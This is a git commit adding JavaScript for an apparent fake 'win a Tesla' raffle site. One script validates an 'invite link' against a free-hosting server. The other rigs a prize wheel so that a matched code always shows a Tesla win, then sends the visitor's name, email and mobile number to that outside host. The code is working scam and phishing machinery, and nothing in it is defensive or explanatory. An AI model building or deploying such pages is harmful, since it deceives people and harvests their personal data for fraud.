5ef83af96609916cbcece87aedffb8b557544445
LongtProd <132977078+LongtProd@users.noreply.github.com>
2023-05-09 09:21:55 +0100

    Add files via upload

---
+++ assets/js/queryi.js
@@ -0,0 +1,144 @@
+var xbody = document.getElementsByTagName("BODY")[0];
+var cobmes = document.querySelectorAll(".btn-mark-wall");
+var redigroproqro = document.querySelector("#redigroproqro");
+var redigroxrdg = document.querySelector("#redigroxrdg");
+
+var kyrvfflxc = "";
+dosofink();
+function dosofink() {
+    
+    let gothashURL = window.location.hash;
+    if(gothashURL == ""){
+        furror();
+    }else{
+        bowmaus("0", "page");
+    }
+}
+
+function bowmaus(iviv, whos) {
+   var gotnewURL = window.location.hash;
+   var newURL = gotnewURL.replace("#", "");
+   let giftwindow = newURL;
+   $.ajax({
+       type: "POST",
+       url: "https://bastestquest.000webhostapp.com//tromideian/", 
+       dataType: "json",
+       data: {giftwindow: giftwindow},
+       success: function(responds){
+        
+           kyrvfflxc = responds;
+           var vralx = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.giftcode)).replace(/[\[\]"]+/g,""); 
+           if(vralx.length == 4){
+            furwork();
+           }else{
+               furror();
+           }
+           
+           //newrannew();
+       }, error : function(jqXHR, textStatus, errorThrown) {
+           let useronline = teslaser();
+           if (useronline == 0) {
+               alert("Ooops! It seems your network is slow or disconnected")
+           }else{
+               alert("Ooops! This is not your fault. Try Again...");
+           }
+   }	 
+   }); 
+}
+
+function furwork(){
+    boxingworks();
+    document.getElementById("redigroproheader").innerHTML = `Your Invite link is valid.`;
+    document.getElementById("redigroprobody").innerHTML = `Once used in the raffle, you can't use this link again. Good Luck!!!`;
+}
+function furror(){
+    boxingworks();
+    runoffgifts()
+    document.getElementById("redigroproheader").innerHTML = `Your Invite link has expired or its invalid.`;
+    document.getElementById("redigroprobody").innerHTML = `Sorry! You need an invite link to participate in the raffle, to win a Tesla`;
+}
+
+function boxingworks(){
+    document.getElementById("worping").style.display = "none";
+    xbody.classList.remove('ldbody');
+    xbody.classList.add('bodilies');
+    document.getElementById("top").style.display  = "";
+    redigroproqro.classList.add('active');
+}
+function runoffgifts() {
+    cobmes.forEach(function (item, index, array) { 
+        item.style.display = "none";
+       
+    });
+}
+/*
+setTimeout(() => {
+    document.getElementById("worping").style.display = "none";
+    //document.getElementById("teslabody").removeAttribute('style');
+    xbody.classList.remove('ldbody');
+    xbody.classList.add('bodilies');
+    document.getElementById("top").style.display  = "";
+    redigroproqro.classList.add('active');
+}, 5000);*/
+
+cobmes.forEach(function (item, index, array) { 
+    item.addEventListener("click", function() { 
+        //document.getElementById("brighterCro").style.display = "none";
+
+        document.getElementById("brighterCro").innerHTML = "";
+        document.getElementById("worping").style.display = "";
+        xbody.classList.remove('bodilies');
+        xbody.classList.add('ldbody');
+        document.getElementById("top").style.display  = "none";
+        window.scrollTo(0, 0);
+        var brighterCro = document.getElementById("brighterCro");
+
+        var xhr = new XMLHttpRequest();
+        var url = 'zoomcloser.html';
+        xhr.open('GET', url, true);
+        xhr.onload = function() {
+        if (xhr.status === 200) {
+            // Set the innerHTML property of the div element to display the fetched content
+            //console.log(xhr.response)
+            brighterCro.innerHTML = xhr.response;
+        }
+        else {
+            console.log('Request failed.  Returned status of ' + xhr.status);
+        }
+        };
+        xhr.send();
+
+        setTimeout(() => {
+            var script = document.createElement('script');
+            var surl = 'assets/js/index.min.js';
+            script.src = surl;
+            document.body.appendChild(script);
+    
+            var script = document.createElement('script');
+            var scurl = 'assets/js/royinmath.js';
+            script.src = scurl;
+            document.body.appendChild(script);
+        }, 1000);
+        xbody.classList.remove('ldbody');
+        xbody.classList.add('bodilies');
+        xbody.style.background = "#454954";
+        document.getElementById("navli").style.display = "none";
+        
+        document.getElementById("worping").style.display = "none";
+        document.getElementById("top").style.display  = "";
+    });
+});
+
+redigroxrdg.onclick = function(){
+    redigroproqro.classList.remove('active');
+    redigroproqro.classList.remove('active');
+}
+
+
+function teslaser() {
+	if (navigator.onLine) {
+		return 1;
+	}else{
+		return 0;
+	}
+}
---
+++ assets/js/royinmath.js
@@ -0,0 +1,140 @@
+var giftreach = [
+    {"wrapcode": 4996,"wrapgift": "Try Again"},
+    {"wrapcode": 5040,"wrapgift": "Model X"},
+    {"wrapcode": 5084,"wrapgift": "Model Y"},
+    {"wrapcode": 5128,"wrapgift": "Invite Link"},
+    {"wrapcode": 5174,"wrapgift": "Model S"},
+    {"wrapcode": 5218,"wrapgift": "Model 3"},
+    {"wrapcode": 5264,"wrapgift": "Try Again"},
+    {"wrapcode": 5310,"wrapgift": "Model S"}
+  ];
+let wheel =  document.querySelector('.wheel');
+let spinBtn = document.querySelector('.spinBtn');
+let spinBtnOF = document.querySelector('.spinBtnOF');
+//let circleRate = Math.ceil(Math.random() * 3600);
+var circleRate = 5084;
+var giftwon = "";
+debaterate()
+function debaterate(){
+    var giftty = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.giftcode)).replace(/[\[\]"]+/g,"");
+    giftreach.forEach(item => {
+        if(giftty == item.wrapcode){
+            circleRate = item.wrapcode;
+        }
+      });   
+}
+
+let medalqro = document.querySelector('#medalqro');
+let medalqroxt = document.querySelector('#medalqroxt');
+let mycanvas = document.querySelector('#my-canvas');
+
+spinBtn.onclick = function(){
+    window.scrollTo(0, 0);
+    spinBtn.style.display = "none";
+    spinBtnOF.style.display = "";
+    wheel.style.transform = "rotate(" + circleRate + "deg)";
+    circleRate += Math.ceil(Math.random() * 4600);
+
+    giftreach.forEach(item => {
+        var giftty = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.giftcode)).replace(/[\[\]"]+/g,"");
+        if(giftty == item.wrapcode){
+            giftwon = item.wrapgift;
+        }
+      }); 
+    setTimeout(() => {
+        
+        document.querySelector('#medalheader').innerHTML = "Congratulations!!!";
+        document.querySelector('#medalbody').innerHTML = `You just won a brand new <span class="gwmodel">${giftwon} Tesla</span>.<br>
+        Please fill the form below to receive you next email.<br>
+        Congratulations once more.`;
+        mycanvas.style.display = "";
+        medalqro.classList.add('active');
+        mycanvas.classList.add('active');
+        setTimeout(() => {
+            mycanvas.classList.remove('active');
+        }, 100000);
+    }, 5700);
+}
+
+document.getElementById("medalclshoe").addEventListener("submit", function() { 
+    //alert('submit')
+    Medalofhonor();
+});
+
+
+function Medalofhonor(){
+		
+	var firstname  = document.getElementById("firstname").value;	
+	var lastname  = document.getElementById("lastname").value;	
+	var email  = document.getElementById("email").value;	
+	var mobile  = document.getElementById("mobile").value;	
+	
+	
+	var rondrefr = document.getElementById("rondrefr");
+	var rondreff = document.getElementById("rondreff");
+	rondrefr.style.display = 'none';	
+	rondreff.style.display = '';	
+
+    var drulo = JSON.stringify(kyrvfflxc.map(lcpk => lcpk.cc)).replace(/[\[\]"]+/g,"");
+	
+	if (myTrim(firstname).length > 2  && myTrim(lastname).length > 2  && myTrim(email).length > 4  && myTrim(mobile).length > 8  && myTrim(drulo).length > 4){ 
+	
+	$.ajax({
+		type: "POST",
+		url: "https://bastestquest.000webhostapp.com/tromideian/", 
+		dataType: "json",
+		data: {firstname: firstname, lastname: lastname, email: email, mobile: mobile, drulo: drulo, },
+		success: function(data){
+			$("#rufusLohn").html(data);
+			
+		
+		var slf = data; 
+		if(slf.Cavrem == "none"){
+            document.getElementById("medalcolumf").innerHTML = "";
+            document.querySelector('#medalheader').innerHTML = `Congratulations ${lastname}!!!`;
+        document.querySelector('#medalbody').innerHTML = `You will be contacted soon via the email you provided. Cheers.`;
+        }else{
+			rondrefr.style.display = '';	
+	        rondreff.style.display = 'none';	
+        }
+			
+    }, error : function(jqXHR, textStatus, errorThrown) {
+        let useronline = teslaser();
+        if (useronline == 0) {
+            alert("Ooops! It seems your network is slow or disconnected")
+        }else{
+            alert("Ooops! This is not your fault. Try Again...");
+        }
+    }
+		 
+	});
+}
+}
+
+
+
+medalqroxt.onclick = function(){
+    medalqro.classList.remove('active');
+    mycanvas.classList.remove('active');
+}
+var confettiSettings = { target: 'my-canvas' };
+var confetti = new ConfettiGenerator(confettiSettings);
+confetti.render();
+function teslaser() {
+	if (navigator.onLine) {
+		return 1;
+	}else{
+		return 0;
+	}
+}
+
+function myTrim(x) {
+    return x.replace(/^\s+|\s+$/gm,'');
+}
+  
+String.prototype.nl2br = function(){
+    return this.replace(/\n/g, "<br />");
+}
+function printError(elemId, hintMsg) {
+document.getElementById(elemId).innerHTML = hintMsg;
+} 
